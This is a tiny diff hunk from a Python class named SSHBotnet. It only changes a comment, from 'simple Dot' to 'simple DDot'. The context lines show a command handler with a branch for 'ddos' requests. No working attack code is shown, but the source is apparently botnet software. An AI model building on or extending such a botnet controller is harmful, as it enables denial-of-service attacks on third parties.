@@ -55,7 +55,7 @@ class SSHBotnet:
         elif request == 3.2:
             self._connect()
             
-        # simple Dot 
+        # simple DDot 
         elif 'ddos' in request:
             info = str(request).replace("ddos ", "").split()
             try:
